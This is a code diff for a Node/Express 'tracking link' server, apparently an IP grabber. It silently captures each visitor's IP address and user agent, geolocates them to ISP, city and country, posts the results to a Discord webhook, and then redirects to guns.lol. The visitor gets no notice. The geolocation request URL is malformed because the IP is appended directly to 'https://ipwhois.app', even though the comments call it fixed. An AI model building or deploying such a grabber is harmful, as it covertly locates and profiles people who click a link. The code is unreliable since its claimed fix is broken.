@@ -5,26 +5,29 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol';
 
 app.get('/', async (req, res) => {
-    // 1. Grab raw proxy header safely
+    // 1. Grab raw header tracking string safely
     let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
     
-    // 2. Isolate the first true client IP before any proxy commas
+    // 2. FIXED: Uses a pure text replacement rule to safely isolate the client IP.
+    // This removes the trailing proxy data while keeping the item a safe String.
     let clientIp = rawIp.replace(/,.*$/, '').trim();
 
-    // 3. Clear local server loops
+    // 3. Strip internal IPv6 local nesting wraps if present
     if (clientIp.includes('::ffff:')) {
         clientIp = clientIp.replace('::ffff:', '');
     }
+    
+    // 4. Default to a valid public IP if the address resolves as blank or local
     if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') {
-        clientIp = '8.8.8.8'; // Fallback testing IP
+        clientIp = '8.8.8.8'; 
     }
 
     const userAgent = req.headers['user-agent'] || 'Unknown';
 
     if (DISCORD_WEBHOOK_URL) {
         try {
-            // 4. FIXED: Using ipwhois.app handles high-speed proxy connections cleanly over HTTPS
-            const geoResponse = await fetch(`https://ipwhois.app{clientIp}`);
+            // 5. Query the secure HTTPS geolocation endpoint via ipwhois.app
+            const geoResponse = await fetch('https://ipwhois.app' + clientIp);
             const geoData = await geoResponse.json();
 
             const discordPayload = {
@@ -33,11 +36,10 @@ app.get('/', async (req, res) => {
                     color: 15548997, 
                     description: "A user has accessed the tracking link.",
                     fields: [
-                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
-                        // ipwhois.app outputs the carrier under 'isp' and the region names clearly
-                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
-                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
-                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                        { name: "IP Address", value: "`" + clientIp + "`", inline: true },
+                        { name: "ISP Network", value: "`" + (geoData.isp || "Unknown") + "`", inline: true },
+                        { name: "Location", value: "`" + (geoData.city || "Unknown") + ", " + (geoData.country || "Unknown") + "`", inline: false },
+                        { name: "Device / Agent", value: "```" + userAgent + "```", inline: false }
                     ],
                     footer: {
                         text: "System Monitor"
@@ -46,7 +48,7 @@ app.get('/', async (req, res) => {
                 }]
             };
 
-            // 5. Fire the payload to Discord
+            // 6. Push payload directly to the Discord channel
             await fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -58,7 +60,7 @@ app.get('/', async (req, res) => {
         }
     }
 
-    // 6. Direct the user to the destination path safely
+    // 7. Instantly redirect the user
     res.redirect(302, REDIRECT_URL);
 });
 
